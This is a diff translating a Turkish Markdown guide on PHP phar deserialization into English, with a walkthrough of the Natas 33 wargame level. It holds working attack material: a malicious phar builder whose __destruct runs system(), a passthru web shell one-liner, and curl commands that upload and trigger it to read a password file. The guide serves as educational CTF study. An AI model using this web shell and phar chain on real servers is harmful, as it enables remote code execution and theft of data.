@@ -1,102 +1,102 @@
-# 🌐 Web Güvenliği — Phar Deserialization
+# 🌐 Web Security — Phar Deserialization
 
-> PHP'de phar:// stream wrapper bir .phar dosyasını açarken
-> içindeki serialized metadata'yı otomatik unserialize eder.
-> Bu, dosya yükleme + LFI kombinasyonuyla RCE'ye yol açar.
+> In PHP, when the phar:// stream wrapper opens a .phar file,
+> it automatically unserializes the serialized metadata inside it.
+> This leads to RCE in combination with file upload + LFI.
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [Phar Nedir?](#phar-nedir)
-- [phar:// Stream Wrapper](#phar-stream-wrapper)
+- [What Is Phar?](#what-is-phar)
+- [The phar:// Stream Wrapper](#the-phar-stream-wrapper)
 - [Phar Metadata Deserialization](#phar-metadata-deserialization)
-- [MD5 İmza Bypass](#md5-i̇mza-bypass)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [MD5 Signature Bypass](#md5-signature-bypass)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## Phar Nedir?
+## What Is Phar?
 
-**Phar (PHP Archive)**, PHP için JAR gibi bir paket formatıdır. Birden fazla PHP dosyasını tek bir `.phar` dosyasında toplar.
+**Phar (PHP Archive)** is a package format for PHP, like JAR. It collects multiple PHP files into a single `.phar` file.
 
 ```
-phar dosyası:
-  ├── stub          (PHP kodu — başlangıç)
-  ├── manifest      (dosya listesi + metadata)
-  ├── contents      (dosya içerikleri)
-  └── signature     (bütünlük imzası — MD5/SHA)
+phar file:
+  ├── stub          (PHP code — the beginning)
+  ├── manifest      (file list + metadata)
+  ├── contents      (file contents)
+  └── signature     (integrity signature — MD5/SHA)
 ```
 
 ---
 
-## phar:// Stream Wrapper
+## The phar:// Stream Wrapper
 
-PHP'de `phar://` stream wrapper ile phar dosyasının içindeki dosyalara erişilir:
+In PHP, the `phar://` stream wrapper is used to access files inside a phar file:
 
 ```php
 include('phar://archive.phar/file.php');
 file_get_contents('phar://archive.phar/data.txt');
 ```
 
-### Kritik Özellik
+### Critical Feature
 
-`phar://` ile bir dosyaya erişildiğinde, PHP phar manifest'ini okur. Manifest'te **serialized PHP nesneleri** saklanabilir ve bunlar **otomatik olarak unserialize edilir** — `unserialize()` çağrısı olmadan bile!
+When a file is accessed via `phar://`, PHP reads the phar manifest. The manifest can store **serialized PHP objects**, and these are **automatically unserialized** — even without a call to `unserialize()`!
 
 ```
-phar:// → manifest'i oku → unserialize(metadata) → __wakeup() / __destruct() tetiklenir
+phar:// → read the manifest → unserialize(metadata) → __wakeup() / __destruct() triggered
 ```
 
-Bu, `file_exists()`, `is_file()`, `file_get_contents()`, `include()` gibi **herhangi bir dosya fonksiyonu** tetikleyebilir.
+This can be triggered by **any file function** like `file_exists()`, `is_file()`, `file_get_contents()`, `include()`.
 
 ---
 
 ## Phar Metadata Deserialization
 
-### Kötü Amaçlı Phar Oluşturma
+### Creating a Malicious Phar
 
 ```php
 <?php
 class SomeClass {
     public $cmd;
     function __destruct() {
-        system($this->cmd);   // tehlikeli magic method
+        system($this->cmd);   // dangerous magic method
     }
 }
 
-// Kötü amaçlı nesne oluştur
+// Create a malicious object
 $obj = new SomeClass();
 $obj->cmd = "cat /etc/natas_webpass/natas34";
 
-// Phar oluştur
+// Create the phar
 $phar = new Phar("evil.phar");
 $phar->startBuffering();
 $phar->addFromString("test.txt", "dummy content");
 $phar->setStub("<?php __HALT_COMPILER(); ?>");
-$phar->setMetadata($obj);    // ← kötü amaçlı nesneyi metadata'ya yaz
+$phar->setMetadata($obj);    // ← write the malicious object into the metadata
 $phar->stopBuffering();
 ?>
 ```
 
-Bu script çalıştırılınca `evil.phar` oluşur. İçindeki metadata'da `SomeClass` nesnesi serialize edilmiş halde durur.
+When this script is run, `evil.phar` is created. The `SomeClass` object is stored serialized in its metadata.
 
-Sunucuda `phar://evil.phar/test.txt` açıldığında → metadata unserialize → `__destruct()` → komut çalışır.
+When `phar://evil.phar/test.txt` is opened on the server → the metadata is unserialized → `__destruct()` → the command runs.
 
 ---
 
-## MD5 İmza Bypass
+## MD5 Signature Bypass
 
-Natas 33'te phar dosyasının MD5 imzası kontrol ediliyor. Imza PHP'de genellikle şöyle doğrulanır:
+In Natas 33, the phar file's MD5 signature is checked. In PHP, the signature is usually verified like this:
 
 ```php
-// Dosyadan imzayı oku, hesaplanan ile karşılaştır
+// Read the signature from the file, compare with the computed one
 $signature = md5_file($uploaded_file);
 if ($signature !== $expected) {
     die("Invalid signature!");
 }
 ```
 
-Ama Natas 33'te `$signature` değişkeni:
+But in Natas 33, the `$signature` variable:
 
 ```php
 class Executor {
@@ -112,15 +112,15 @@ class Executor {
 True == "anystring"   // true!  (non-empty string → truthy)
 ```
 
-Yani imza kontrolü `True == [herhangi_bir_md5]` → her zaman true → bypass!
+So the signature check is `True == [any_md5]` → always true → bypass!
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 33 — Phar Deserialization + İmza Bypass
+### Natas 33 — Phar Deserialization + Signature Bypass
 
-**Kaynak kod (özet):**
+**Source code (summary):**
 
 ```php
 class Executor {
@@ -146,35 +146,35 @@ class Executor {
 if(isset($_POST['filename'])) {
     $e = new Executor();
     $e->filename = $_POST['filename'];
-    // Dosyayı kaydet
+    // Save the file
     file_put_contents($uploaded_file, file_get_contents("php://input"));
 }
 ```
 
-**Analiz:**
+**Analysis:**
 
-1. `$signature = True` → imza kontrolü her zaman geçer (loose comparison)
-2. `__destruct()` → `include($this->filename)` → phar:// ile web shell include et
-3. Dosya yükleme var → kötü amaçlı phar yükleyebiliriz
+1. `$signature = True` → the signature check always passes (loose comparison)
+2. `__destruct()` → `include($this->filename)` → include a web shell via phar://
+3. There's a file upload → we can upload a malicious phar
 
-**Exploit Adımları:**
+**Exploit Steps:**
 
-**Adım 1: Web shell hazırla**
+**Step 1: Prepare the web shell**
 
 ```bash
 echo '<?php passthru($_GET["cmd"]); ?>' > shell.php
 ```
 
-**Adım 2: Web shell'i yükle**
+**Step 2: Upload the web shell**
 
 ```bash
-curl -u natas33:[şifre] \
+curl -u natas33:[password] \
      -X POST \
      --data-binary @shell.php \
      "http://natas33.natas.labs.overthewire.org/index.php?filename=shell.php"
 ```
 
-**Adım 3: Kötü amaçlı phar oluştur**
+**Step 3: Create the malicious phar**
 
 ```php
 <?php
@@ -192,7 +192,7 @@ $phar->addFromString("test.txt", "test");
 $phar->setStub("<?php __HALT_COMPILER(); ?>");
 $phar->setMetadata($obj);
 $phar->stopBuffering();
-rename("evil.phar", "evil.jpg");   // jpg olarak yükle
+rename("evil.phar", "evil.jpg");   // upload as jpg
 ?>
 ```
 
@@ -200,58 +200,58 @@ rename("evil.phar", "evil.jpg");   // jpg olarak yükle
 php create_phar.php
 ```
 
-**Adım 4: Phar dosyasını yükle**
+**Step 4: Upload the phar file**
 
 ```bash
-curl -u natas33:[şifre] \
+curl -u natas33:[password] \
      -X POST \
      --data-binary @evil.jpg \
      "http://natas33.natas.labs.overthewire.org/index.php?filename=evil.jpg"
 ```
 
-**Adım 5: phar:// ile tetikle**
+**Step 5: Trigger it via phar://**
 
 ```bash
-curl -u natas33:[şifre] \
+curl -u natas33:[password] \
      -X POST \
      -d "filename=phar://evil.jpg/test.txt" \
      "http://natas33.natas.labs.overthewire.org/index.php"
 ```
 
-`phar://evil.jpg/test.txt` → phar açılır → metadata unserialize → `__destruct()` → `include("shell.php")` → shell çalışır.
+`phar://evil.jpg/test.txt` → the phar is opened → the metadata is unserialized → `__destruct()` → `include("shell.php")` → the shell runs.
 
-**Adım 6: Komutu çalıştır**
+**Step 6: Run the command**
 
 ```bash
-curl -u natas33:[şifre] \
+curl -u natas33:[password] \
      "http://natas33.natas.labs.overthewire.org/shell.php?cmd=cat+/etc/natas_webpass/natas34"
 ```
 
 ---
 
-### Phar Deserialization — Kontrol Listesi
+### Phar Deserialization — Checklist
 
 ```
-Tespit:
-  ☐ Dosya yükleme + dosya işleme var mı?
-  ☐ file_exists(), is_file(), include() gibi fonksiyonlar kullanıcı girdisiyle çağrılıyor mu?
-  ☐ unserialize() olmasa bile phar:// tetikleyebilir
+Detection:
+  ☐ Is there a file upload + file handling?
+  ☐ Are functions like file_exists(), is_file(), include() called with user input?
+  ☐ Even without unserialize(), phar:// can trigger it
 
 Exploit:
-  ☐ Hedef sınıfın __destruct veya __wakeup'ını bul
-  ☐ Kötü amaçlı nesneyi metadata'ya göm → Phar oluştur
-  ☐ Phar dosyasını farklı uzantıyla yükle (.jpg, .png)
-  ☐ phar:// stream wrapper ile tetikle
-  ☐ $signature = True varsa imza kontrolü bypass
+  ☐ Find the __destruct or __wakeup of the target class
+  ☐ Embed the malicious object into the metadata → create a Phar
+  ☐ Upload the phar file with a different extension (.jpg, .png)
+  ☐ Trigger it with the phar:// stream wrapper
+  ☐ If $signature = True, bypass the signature check
 
-PHP Phar oluşturmak için:
-  ☐ php.ini'de phar.readonly = Off olmalı
-  ☐ php create_phar.php ile oluştur
+To create a PHP Phar:
+  ☐ phar.readonly = Off must be set in php.ini
+  ☐ Create it with php create_phar.php
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — Phar Deserialization](https://portswigger.net/web-security/deserialization/exploiting)
 - [Secarma — File Upload to RCE via Phar](https://secarma.com/using-phar-archives-to-bypass-file-type-restrictions/)
@@ -260,6 +260,6 @@ PHP Phar oluşturmak için:
 
 ---
 
-**Önceki konu:** [23_log_poisoning.md](./23_log_poisoning.md)
+**Previous topic:** [23_log_poisoning.md](./23_log_poisoning.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
